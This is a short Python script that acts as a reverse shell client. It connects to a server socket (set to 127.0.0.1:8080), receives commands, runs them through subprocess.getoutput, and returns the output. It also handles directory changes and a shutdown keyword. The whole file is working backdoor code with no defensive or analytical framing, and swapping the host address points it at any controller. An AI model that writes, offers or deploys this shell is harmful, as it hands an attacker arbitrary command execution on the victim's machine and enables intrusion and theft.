import socket, subprocess, os, sys

def close():
    s.close()
    print("Closing!")
    exit(0)

SERVER_HOST = "127.0.0.1"
SERVER_PORT = 8080
BUFFER_SIZE = 1024 * 128 #128KB max size

s = socket.socket() #Establish socket connection
s.connect((SERVER_HOST,SERVER_PORT)) #Connect to server

while True:
    command = s.recv(BUFFER_SIZE).decode() #Recieve the command from the server and decode it into a string
    splitted_command = command.split() #Split the command
    if command == "exit": #if the user wants to exit, then keep connection alive
        continue
    elif command == "SERVER_SHUTDOWN":
        break
    elif splitted_command[0] == "cd": #if the user wants to change directories
        try:
            os.chdir(' '.join(splitted_command[1:])) #use os to change the directory
        except FileNotFoundError as e: #if it isn't a thing, output the error to a variable
            output = str(e)
            continue
        else: #if it worked, don't send anything
            output = ""
            continue
    else: #if the user doesn't want to change directories, run the command and capture the output
        output = subprocess.getoutput(command)

    message = f"{output}" #encapsulate the output and send it
    s.send(message.encode())
s.close() #close the socket 